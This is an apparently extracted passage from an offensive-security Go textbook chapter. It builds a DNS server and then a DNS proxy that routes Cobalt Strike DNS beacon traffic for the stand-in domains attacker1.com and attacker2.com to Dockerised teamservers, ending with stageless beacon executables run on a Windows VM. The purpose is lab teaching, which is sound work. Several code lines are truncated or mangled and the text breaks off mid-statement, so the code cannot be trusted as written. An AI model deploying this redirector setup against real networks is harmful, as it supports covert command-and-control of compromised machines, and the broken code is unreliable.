To test your lab setup and to introduce you to writing DNS
servers, start by writing a basic server that returns only A
records. In your GOPATH on the Ubuntu system, create a new
directory called github.com/blackhat-go/bhg/ch-5/a_server
and a file to hold your main.go code. Listing 5-5 shows the
entire code for creating a simple DNS server.
package main
import (
"log"
"net"
"github.com/miekg/dns"
)
func main() {
❶ dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
❷ var resp dns.Msg
resp.SetReply(req)
for _, q := range req.Question {
❸ a := dns.A{
Hdr: dns.RR_Header{
Name: q.Name,
Rrtype: dns.TypeA,
Class: dns.ClassINET,
Ttl: 0,
},
A: net.ParseIP("127.0.0.1").To4(),
}
❹ resp.Answer = append(resp.Answer, &a)
}
❺ w.WriteMsg(&resp)
})
❻ log.Fatal(dns.ListenAndServe(":53", "udp", nil))
}
Listing 5-5: Writing a DNS server (/ch-5/a_server/main.go)
The server code starts with a call to HandleFunc() ❶; it looks
a lot like the net/http package. The function’s first argument is a
query pattern to match. You’ll use this pattern to indicate to
the DNS servers which requests will be handled by the
supplied function. By using a period, you’re telling the server
that the function you supply in the second argument will
handle all requests.
The next argument passed to HandleFunc() is a function
containing the logic for the handler. This function receives two
arguments: a ResponseWriter and the request itself. Inside the
handler, you start by creating a new message and setting the
reply ❷. Next, you create an answer for each question, using
an A record, which implements the RR interface. This portion
will vary depending on the type of answer you’re looking for
❸. The pointer to the A record is appended to the response’s
Answer field by using append() ❹. With the response complete,
you can write this message to the calling client by using
w.WriteMsg() ❺. Finally, to start the server, ListenAndServe() is
called ❻. This code resolves all requests to an IP address of
127.0.0.1.
Once the server is compiled and started, you can test it by
using dig. Confirm that the hostname for which you’re
querying resolves to 127.0.0.1. That indicates it’s working as
designed.
$ dig @localhost facebook.com
; > DiG 9.10.3-P4-Ubuntu > @localhost facebook.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER 
The IP address provided should be that of your actual VM,
not the IP address of the container.
Next, open a new terminal window on the Ubuntu host and
change into the directory containing the Cobalt Strike tarball.
Execute the following commands to install Java and start the
Cobalt Strike client:
$ sudo add-apt-repository ppa:webupd8team/java
$ sudo apt update
$ sudo apt install oracle-java8-installer
$ tar -zxvf cobaltstrike-trial.tgz
$ cd cobaltstrike
$ ./cobaltstrike
The GUI for Cobalt Strike should start up. After clearing
the trial message, change the teamserver port to 50051 and set
your username and password accordingly.
You’ve successfully started and connected to a server
running completely in Docker! Now, let’s start a second server
by repeating the same process. Follow the previous steps to
start a new teamserver. This time, you’ll map different ports.
Incrementing the ports by one should do the trick and is
logical. In a new terminal window, execute the following
command to start a new container and listen on ports 2021 and
50052:
$ docker run --rm -it -p 2021:53 -p 50052:50050-v full path to cobalt strike
download:/data java /bin/bash
From the Cobalt Strike client, create a new connection by
selecting Cobalt Strike ▶ New Connection, modifying the
port to 50052, and selecting Connect. Once connected, you
should see two tabs at the bottom of the console, which you
can use to switch between servers.
Now that you’ve successfully connected to the two
teamservers, you should start two DNS listeners. To create a
listener, select Configure Listeners from the menu; its icon
looks like a pair of headphones. Once there, select Add from
the bottom menu to bring up the New Listener window. Enter
the following information:
Name: DNS 1
Payload: windows/beacon_dns/reverse_dns_txt
Host: 
Port: 0
In this example, the port is set to 80, but your DNS payload
still uses port 53, so don’t worry. Port 80 is specifically used
for hybrid payloads. Figure 5-2 shows the New Listener
window and the information you should be entering.
Figure 5-2: Adding a new listener
Next, you’ll be prompted to enter the domains to use for
beaconing, as shown in Figure 5-3.
Enter the domain attacker1.com as the DNS beacon, which
should be the domain name to which your payload beacons.
You should see a message indicating that a new listener has
started. Repeat the process within the other teamserver, using
DNS 2 and attacker2.com. Before you start using these two
listeners, you’ll need to write an intermediary server that
inspects the DNS messages and routes them appropriately.
This, essentially, is your proxy.
Figure 5-3: Adding the DNS beacon’s domain
Creating a DNS Proxy
The DNS package you’ve been using throughout this chapter
makes writing an intermediary function easy, and you’ve
already used some of these functions in previous sections.
Your proxy needs to be able to do the following:
Create a handler function to ingest an incoming query
Inspect the question in the query and extract the domain name
Identify the upstream DNS server correlating to the domain name
Exchange the question with the upstream DNS server and write the response to
the client
Your handler function could be written to handle
attacker1.com and attacker2.com as static values, but that’s
not maintainable. Instead, you should look up records from a
resource external to the program, such as a database or a
configuration file. The following code does this by using the
format of domain,server, which lists the incoming domain and
upstream server separated by a comma. To start your program,
create a function that parses a file containing records in this
format. The code in Listing 5-6 should be written into a new
file called main.go.
package main
import (
"bufio"
"fmt"
"os"
"strings"
)
❶ func parse(filename string) (map[string]string❷, error) {
records := make(map[string]string)
fh, err := os.Open(filename)
if err != nil {
return records, err
}
defer fh.Close()
scanner := bufio.NewScanner(fh)
for scanner.Scan() {
line := scanner.Text()
parts := strings.SplitN(line, ",", 2)
if len(parts) 
proxy.config
$ go build
$ ./dns_proxy
map[attacker1.com:127.0.0.1:2020 attacker2.com:127.0.0.1:2021]
What are you looking at here? The output is the mapping
between teamserver domain names and the port on which the
Cobalt Strike DNS server is listening. Recall that you mapped
ports 2020 and 2021 to port 53 on your two separate Docker
containers. This is a quick and dirty way for you to create
basic configuration for your tool so you don’t have to store it
in a database or other persistent storage mechanism.
With a map of records defined, you can now write the
handler function. Let’s refine your code, adding the following
to your main() function. It should follow the parsing of your
config file.
❶ dns.HandleFunc(".",func(w dns.ResponseWriter, req *dns.Msg)❷ {
❸ if len(req.Question)  1 {
❺ name = strings.Join(parts[len(parts)-2:], ".")
}
❻ match, ok:= records[name]
if !ok {
dns.HandleFailed(w, req)
return
}
❼ resp, err := dns.Exchange(req, match)
if err != nil {
dns.HandleFailed(w, req)
return
}
❽ if err := w.WriteMsg(resp); err != nil {
dns.HandleFailed(w, req)
return
}
})
❾ log.Fatal(dns.ListenAndServe(":53", "udp", nil))
To begin, call HandleFunc() with a period to handle all
incoming requests ❶, and define an anonymous function ❷,
which is a function that you don’t intend to reuse (it has no
name). This is good design when you have no intention to
reuse a block of code. If you intend to reuse it, you should
declare and call it as a named function. Next, inspect the
incoming questions slice to ensure that at least one question is
provided ❸, and if not, call HandleFailed() and return to exit the
function early. This is a pattern used throughout the handler. If
at least a single question does exist, you can safely pull the
requested name from the first question ❹. Splitting the name
by a period is necessary to extract the domain name. Splitting
the name should never result in a value less than 1, but you
should check it to be safe. You can grab the tail of the slice—
the elements at the end of the slice—by using the slice operator
on the slice ❺. Now, you need to retrieve the upstream server
from the records map.
Retrieving a value from a map ❻ can return one or two
variables. If the key (in our case, a domain name) is present on
the map, it will return the corresponding value. If the domain
isn’t present, it will return an empty string. You could check if
the returned value is an empty string, but that would be
inefficient when you start working with types that are more
complex. Instead, assign two variables: the first is the value
for the key, and the second is a Boolean that returns true if the
key is found. After ensuring a match, you can exchange the
request with the upstream server ❼. You’re simply making
sure that the domain name for which you’ve received the
request is configured in your persistent storage. Next, write the
response from the upstream server to the client ❽. With the
handler function defined, you can start the server ❾. Finally,
you can now build and start the proxy.
With the proxy running, you can test it by using the two
Cobalt Strike listeners. To do this, first create two stageless
executables. From Cobalt Strike’s top menu, click the icon that
looks like a gear, and then change the output to Windows Exe.
Repeat this process from each teamserver. Copy each of these
executables to your Windows VM and execute them. The
DNS server of your Windows VM should be the IP address of
your Linux host. Otherwise, the test won’t work.
It may take a moment or two, but eventually you should see
a new beacon on each teamserver. Mission accomplished!
Finishing Touches
This is great, but when you have to change the IP address of
your teamserver or redirector, or if you have to add a record,
you’ll have to restart the server as well. Your beacons would
likely survive such an action, but why take the risk when
there’s a much better option? You can use process signals to
tell your running program that it needs to reload the
configuration file. This is a trick that I first learned from Matt
Holt, who implemented it in the great Caddy Server. Listing 5-
7 shows the program in its entirety, complete with process
signaling logic:
package main
import (
"bufio"
"fmt"
"log"
"os"
"os/signal"
"strings"
"sync"
"syscall"
"github.com/miekg/dns"
)
func parse(filename string) (map[string]string, error) {
records := make(map[string]string)
fh, err := os.Open(filename)
if err != nil {
return records, err
}
defer fh.Close()
scanner := bufio.NewScanner(fh)
for scanner.Scan() {
line := scanner.Text()
parts := strings.SplitN(line, ",", 2)
if len(parts)  %s\n", k, v)